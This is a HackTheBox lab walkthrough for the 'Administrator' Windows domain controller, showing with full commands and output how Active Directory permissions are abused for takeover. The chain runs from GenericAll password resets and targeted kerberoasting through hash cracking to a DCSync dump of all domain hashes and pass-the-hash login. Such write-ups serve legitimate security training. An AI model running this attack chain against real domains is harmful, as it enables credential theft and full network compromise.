---
categories:
- Hackthebox
image:
  path: admin.png
layout: post
media_subpath: /assets/images/administrator
tags:
- hackthebox
- writeup
- windows
- active-directory
- bloodhound
- genericall
- genericwrite
- shadow-credentials
- targeted-kerberoasting
- ftp
- passwordsafe
- dcsync
- medium
title: HTB - Administrator Walkthrough
---




## INTRO

Administrator is a medium-difficulty Windows domain controller that demonstrates several Active Directory privilege escalation techniques. The attack path leverages BloodHound to identify permission chains including **GenericAll** and **GenericWrite**, followed by password changes, FTP enumeration, Password Safe cracking, targeted kerberoasting, and ultimately DCSync for domain compromise.

## Technical Concepts: Active Directory Permissions
Before diving in, it's important to understand the permission types we'll encounter:

| Permission | Description | What You Can Do |
|------------|-------------|------------------|
| **GenericAll** | Full control over the object | Change password, add Shadow Credentials, modify any attribute, delete object |
| **GenericWrite** | Write access to all attributes | Modify any writable attribute (like scriptPath, description, etc.) |
| **WriteProperty** | Write access to specific properties | Modify certain attributes but not all |
| **Self** | Permissions on yourself | Limited, usually for self-service password reset |

**Why GenericAll is powerful:** It's equivalent to being the owner of the object. With GenericAll on a user, you can:
- Reset their password (without knowing the old one)
- Add Shadow Credentials for certificate-based auth
- Add them to groups
- Modify their SPNs for kerberoasting
- Disable/enable the account
**Why GenericWrite is also useful:** While not as powerful as GenericAll, GenericWrite allows you to modify attributes that can lead to privilege escalation, such as:
- Setting `scriptPath` to run code at logon
- Adding SPNs to make a user kerberoastable
- Modifying `msDS-KeyCredentialLink` for Shadow Credentials (if supported)
## Reconnaissance
### Port Scanning
Initial `nmap` scan reveals a domain controller with standard AD services:

```
nmap -sCV -oA nmap/Administrator 10.129.6.209
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-19 15:30 +0300
Nmap scan report for 10.129.6.209
Host is up (0.21s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-19 19:30:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-19T19:31:06
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m15s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.39 seconds
```

**Key Findings:**

- Domain: `administrator.htb`
- Domain Controller: `dc.administrator.htb`
- FTP service on port 21
- WinRM enabled on port 5985

Add domain to hosts file:

```
echo '10.129.6.209    dc.administrator.htb administrator.htb dc' | sudo tee -e /etc/hosts
```

### FTP Access Attempt

Initial FTP login fails with our provided credentials:

```
ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:d4rkc0de): Olivia
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> 

```

### SMB Enumeration

Enumerating SMB shares with our credentials:

```
nxc smb administrator.htb -u 'Olivia' -p 'ichliebedich' --shares
SMB         10.129.6.209    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.209    445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.6.209    445    DC               [*] Enumerated shares
SMB         10.129.6.209    445    DC               Share           Permissions     Remark
SMB         10.129.6.209    445    DC               -----           -----------     ------
SMB         10.129.6.209    445    DC               ADMIN$                          Remote Admin
SMB         10.129.6.209    445    DC               C$                              Default share
SMB         10.129.6.209    445    DC               IPC$            READ            Remote IPC
SMB         10.129.6.209    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.6.209    445    DC               SYSVOL          READ            Logon server share 
```

Only default shares are available - no non-default shares accessible.

### User Enumeration

Dumping domain users:

```
nxc smb administrator.htb -u 'Olivia' -p 'ichliebedich' --users 
SMB         10.129.6.209    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.209    445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.6.209    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.6.209    445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain 
SMB         10.129.6.209    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.6.209    445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account 
SMB         10.129.6.209    445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.129.6.209    445    DC               michael                       2024-10-06 01:33:37 0        
SMB         10.129.6.209    445    DC               benjamin                      2024-10-06 01:34:56 0        
SMB         10.129.6.209    445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.129.6.209    445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.129.6.209    445    DC               alexander                     2024-10-31 00:18:04 0        
SMB         10.129.6.209    445    DC               emma                          2024-10-31 00:18:35 0        
SMB         10.129.6.209    445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
```

### Kerberoasting/AS-REP Roasting Attempts

No users are vulnerable to these attacks:

```
nxc ldap administrator.htb -u 'Olivia' -p 'ichliebedich' --asreproast test --kerberoasting test
LDAP        10.129.6.209    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.6.209    389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.129.6.209    389    DC               No entries found!
LDAP        10.129.6.209    389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.6.209    389    DC               [*] Total of records returned 
```

## BloodHound Analysis

### Fixing Clock Skew

Kerberos is time-sensitive - fixing clock skew before BloodHound:

```
sudo ntpdate dc.administrator.htb
2026-03-19 22:42:28.168531 (+0300) +25215.758699 +/- 0.120552 dc.administrator.htb 10.129.6.209 s1 no-leap
CLOCK: time stepped by 25215.758699
```

### Collecting BloodHound Data

```
bloodhound-python -d administrator.htb -u Olivia -p ichliebedich -ns 10.129.6.209 -c all --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 01M 00S
INFO: Compressing output into 20260319224239_bloodhound.zip
```


### Attack Path Discovery

![img](Pasted image 20260319224815.png)

**BloodHound Reveals:**

1. `olivia` has **GenericAll** on `michael`
2. `michael` is a member of `Remote Management Users`
3. `Remote Management Users` can WinRM to the DC


## Lateral Movement to michael

### Technical Concept: GenericAll Abuse

With GenericAll on `michael`, we have multiple options:

1. **Password Change**: Simplest approach, but may alert the user
2. **Shadow Credentials**: More stealthy, adds certificate-based auth
3. **S4U2Self Abuse**: Can request tickets without password change

### Adding GenericAll Permission

Using `bloodyAD` to grant ourselves GenericAll on `michael`:

```
bloodyAD -d administrator.htb -u Olivia -p ichliebedich --host 10.129.6.209 add genericAll michael Olivia
[+] Olivia has now GenericAll on michael
```

### Shadow Credentials Attempt

Attempting to add Shadow Credentials (certificate-based authentication):

```
bloodyAD -d administrator.htb -u Olivia -p ichliebedich --host 10.129.6.209 add shadowCredentials michael
[+] KeyCredential generated with following sha256 of RSA key: 068f20c61de0536117d8aed79573c674c8352d1d9b20a50fb46cfe086e3d106f
No outfile path was provided. The certificate(s) will be stored with the filename: QFAKV4iR
[+] Saved PEM certificate at path: QFAKV4iR_cert.pem
[+] Saved PEM private key at path: QFAKV4iR_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem QFAKV4iR_cert.pem -key-pem QFAKV4iR_priv.pem administrator.htb/michael QFAKV4iR.ccache
```

**Error: KDC_ERR_PADATA_TYPE_NOSUPP**

```
python3 PKINITtools/gettgtpkinit.py -cert-pem QFAKV4iR_cert.pem -key-pem QFAKV4iR_priv.pem administrator.htb/michael QFAKV4iR.ccache
2026-03-19 22:56:28,408 minikerberos INFO     Loading certificate and key from file
2026-03-19 22:56:28,421 minikerberos INFO     Requesting TGT
Traceback (most recent call last):
  File "/home/d4rkc0de/LABS/HTB/Track/ActiveDirectory/certs/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
  File "/home/d4rkc0de/LABS/HTB/Track/ActiveDirectory/certs/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
  File "/home/d4rkc0de/LABS/HTB/Track/ActiveDirectory/certs/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
          ^^^^^^^^^^^^^^^^^^
  File "/home/d4rkc0de/LABS/HTB/Track/ActiveDirectory/certs/PKINITtools/.env/lib/python3.11/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
```

T**echnical Explanation:** This error indicates the Domain Controller does not support PKINIT (Kerberos authentication with certificates). Some AD environments disable certificate-based authentication for compatibility or security reasons.

### Fallback: Password Change

Since PKINIT isn't supported, we fall back to password change:

```
bloodyAD -d administrator.htb -u Olivia -p ichliebedich --host 10.129.6.209 set password michael 'Pass!@#$'
[+] Password changed successfully!
```

### Obtaining TGT for michael

```
getTGT.py 'administrator.htb/michael:Pass!@#$' -dc-ip 10.129.6.209
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in michael.ccache

export KRB5CCNAME=michael.ccache
```

### Configuring Kerberos

```
nxc smb administrator.htb --use-kcache --generate-krb5-file krb5.conf
SMB         administrator.htb 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         administrator.htb 445    DC               [+] krb5 conf saved to: krb5.conf
SMB         administrator.htb 445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         administrator.htb 445    DC               [+] ADMINISTRATOR.HTB\michael from ccache 

export KRB5_CONFIG=krb5.conf
```

### WinRM Access as michael

```
evil-winrm -i dc.administrator.htb -r administrator.htb -K michael.ccache
                                        
Evil-WinRM shell v3.9
                                        
Warning: KRB5CCNAME is already set to: michael.ccache. Using existing value instead of /home/d4rkc0de/LABS/HTB/Track/ActiveDirectory/certs/michael.ccache
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> 
```

### Privilege Check

```
*Evil-WinRM* PS C:\Users\michael\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\michael\Documents> 
```

No special privileges - standard user.

### FTP Access Still Fails

```
ftp administrator.htb
Connected to dc.administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:d4rkc0de): michael
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp>
```

## BloodHound Reanalysis

Running BloodHound again with `michael` credentials reveals new paths:

![img](Pasted Pasted image 20260319235230.pngimage 20260319233457.png)

**New Attack Path:**

- `michael` has **GenericAll** on `benjamin`
- `benjamin` has access to FTP

## Lateral Movement to benjamin

### Password Change for benjamin

```
bloodyAD -d administrator.htb -u michael -p 'Pass!@#$' --host 10.129.6.209 set password benjamin 'Pass!@#$'
[+] Password changed successfully!
```

### Obtaining TGT for benjamin

```
getTGT.py 'administrator.htb/benjamin:Pass!@#$' -dc-ip 10.129.6.209
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in benjamin.ccache

export KRB5CCNAME=benjamin.ccache
```

### FTP Access as benjamin

```
ftp administrator.htb
Connected to dc.administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:d4rkc0de): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

### Discovering Password Safe File

```
ftp> ls
229 Entering Extended Passive Mode (|||54863|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
200 Type set to I.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||54866|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************************************************************|   952        4.47 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (4.46 KiB/s)
ftp> 
```

## Password Safe Cracking

### Technical Concept: Password Safe

**Password Safe** is a password management tool that stores encrypted credentials in `.psafe3` files. The encryption uses:
- SHA256 for key derivation
- Twofish cipher for encryption
- Configurable iteration counts

### Extracting Hash with pwsafe2john

```
pwsafe2john ftp/Backup.psafe3 > hashes/backup.hash
```

### Cracking with John/RockYou

```
john hashes/backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2026-03-19 23:36) 1.515g/s 12412p/s 12412c/s 12412C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Cracked Password:** `tekieromucho`
### Opening the Password Safe

![img](Pasted image 20260319235230.png)

**Credentials Found:**

- `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

## Access as emily

### Verifying WinRM Access

```
nxc winrm administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb                          
WINRM       10.129.6.209    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.6.209    5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

**Note:** `(Pwn3d!)` indicates administrative privileges? Actually, this flag in nxc often indicates the user is in the Remote Management Users group or has local admin rights. Let's check:

### WinRM Access

```
evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> 
```

### User Flag

**User flag**: `C:\Users\emily\Desktop\user.txt`

### Privilege Check

```
*Evil-WinRM* PS C:\Users\emily\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily\Desktop> 
```

Standard user - no special privileges.

## BloodHound Reanalysis with emily

![img](Pasted image 20260319235230.png)

**New Attack Path:**

- `emily` has **GenericWrite** on `ethan`
- `ethan` has privileges to DCSync
    

![img](Pasted image 20260319235309.png)

### Technical Concept: GenericWrite vs GenericAll

**GenericWrite** is more limited than GenericAll but still valuable:

- Cannot change password directly
    
- Can modify attributes like `servicePrincipalName` (SPN)
    
- Can make a user kerberoastable by adding SPNs
    

**Why this matters:** By adding an SPN to `ethan`, we can kerberoast them and potentially crack their password.

## Targeted Kerberoasting

### Technical Concept: Targeted Kerberoasting

**Standard Kerberoasting** requires the target to already have an SPN. **Targeted Kerberoasting** leverages write permissions to:

1. Add an SPN to a user (requires GenericWrite)
    
2. Request a service ticket for that user
    
3. Crack the ticket offline
    
4. Remove the SPN (optional, for stealth)
    

### Adding SPN and Requesting Ticket

Using `targetedKerberoast.py` to automate the process:

```
python3 targetedKerberoast.py -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user ethan -o ../hashes/ethan.hash
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[+] Writing hash to file for (ethan)
```

### Cracking the TGS Hash

```
hashcat ../hashes/ethan.hash /usr/share/wordlists/rockyou.txt                            
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz, 6677/13355 MB (2048 MB allocatable), 4MCU

Autodetecting hash-modes. Please be patient...
<....SNIP....>

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$afeee7b98bb29536f576273f39d5ae60$e97dfc39b8e78c2dc11d529acda63fd067f2d91032d4aa1e84250ef294b99229027a763490f6f94d9ddfe578193e19a40469927349985cfe4b1ffac9e185f67ca0c2e646d08e49fc95c59afee85254fe88159d5dbdfa930db309e8aa68199794010630550023412464a7e78f73f304792e5111a1da6590bf5c52f3cadba4559f4380d5197ed8d367a22ae883e4a8ab293642efecf208736c230b9ceba9325551d04f0a40579260f5da0112e9fbd71f46fb198faaf00c19799e24f06e0ee4c5c3e42b6c29a6d82a4bb29a4db648503c214a29b3e3bee55dd221a9cfc4aeef1daf1a46919a3d4ffe93ed35f8618226da64a24f07c58e210539d63f58c13919d9c7f0d1a59eb5bf8f0a13c5ccbbbc6cfe87398016a5aa4a4ecc87e439704835cae7f1a1a3e922fd5bc49fae9132b9224eac83592066ce808dd20590a350bb5767b5e7c473eada48f93a0f82cf00f659e7f1e05faa02977a50b6270fa19950eb8cad3cd7b1542ee18be166bf0b5b7ce8232d49987cd7438dcb2a81b5a52ec6041a3a47ca1bd2ca04ff00187e89b3dbb4a63eb310953fabdd8959a703ef7ca0c54513028ca14891b088a74c8aa24d1ee8a645bc6ad0ea19e186f681e354bbb193f6be07e2e402eb467987eba0a0d5bf185e3f9e3155927982b5f7602ad22e33014b9e3228726cf2ef994e6cce1fc171a623b8a3233fd76b4433ec9e42fddeb736f41b45c1333dd4b82ee7e014854f215d95ed29373bd805ec4fb538d29b4b6112879553c0819e2d00f2c7e9f5b733f0167f580c5e6cfc2ffc9972bd2612b7923b9e8501cc7e68f4bcab75f3148cba9c5402c9bf27fe99c606898050cd19619a2291f12610cd9df8b520c206e5556c9115e8d3d62dab2b2621c25aa043e768c88693e1448790c4e42d696c203c88de7ddfd1a05b9373e0cce8121a023cee55d3df5427573b78ff821a1b3a416e63a2f995c82c9b5b05bb8b62a4793b3b24467c0d3658b27fc66007e122e5fe7bfd83c1940b536be31512a929f5cbdad910a301dd1d9cc6e5b8c799a1a5734efcef782bc68cb8f187c464acdae9d4c67c27998f051f46d380a1fbe0eee496ba22ff854ba195afec019c286757a30182436f26b5214e22c570a5920690e6bc1ff5dc7ea4baf48ae5714ed475d3e002d83a12d1aca16441b9009e094bc4829d93fae6562048b2f1262d2d90bffad6bf0205aff894387178d4183dd13c0067eca739ee3035567b459feeee58f6c9b19dc5fc97867ddde6bc609388ce4e6cfec5d39df85465198b1175a4da8ba720b600e905547dcc373efc90f4c562894cf70b42bee25ebb3126115d7f729765927bf8568bbe7628775b5f42a3134eea6390350248738385d9d068e81e2c7531c7780c5817d9fceba898591840813946f7cc878dcb784b314d5818045f6857d39f9d2918107a287106d7caf9d9a5375e8007519dc4f3970501fd81d16d878c4bd4b10ebd06961ac226bacfff7ae50e488b3184fe685c06122a01c86aef2854ccb0831e5f8d555019df32:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....19df32
Time.Started.....: Fri Mar 20 00:10:29 2026 (1 sec)
Time.Estimated...: Fri Mar 20 00:10:30 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   150.9 kH/s (13.30ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: newzealand -> whitetiger
Hardware.Mon.#01.: Temp: 45c Util: 73%

Started: Fri Mar 20 00:10:15 2026
Stopped: Fri Mar 20 00:10:34 2026
```

**Cracked Password:** `limpbizkit`

## Domain Compromise via DCSync

### Technical Concept: DCSync

**DCSync** is a attack that simulates domain controller replication:

- Uses Directory Replication Service (DRS) protocol
- Requests password hashes for all domain users
- Requires **Replicating Directory Changes** privileges
- `ethan` has these privileges (as shown in BloodHound)

```
secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:76963fa2b1674971e6ead8e7ebc2662e:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:dcc0a7a933b40e46348c869ecb1d8efe:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:58c918d22809aa2a6f521fc17ae532af5d906ed3d4476615d6b55696d2c50efe
administrator.htb\michael:aes128-cts-hmac-sha1-96:2521f4de905966f91e699864f2edb868
administrator.htb\michael:des-cbc-md5:73e3d652cd3494b3
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:dbda3fcad1f8704807d00147a2ea419dd47c2f7319f19733715d8ec41f21a687
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:08139a1f89644506e17c8ca3c2141868
administrator.htb\benjamin:des-cbc-md5:d07f799e169731a7
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

**Administrator NTLM Hash:** `3dc553ce4b9fd20bd016e098d2d2fd2e`

### Final WinRM as Administrator

```
evil-winrm -i administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

**Root flag**: `C:\Users\Administrator\Desktop\root.txt`

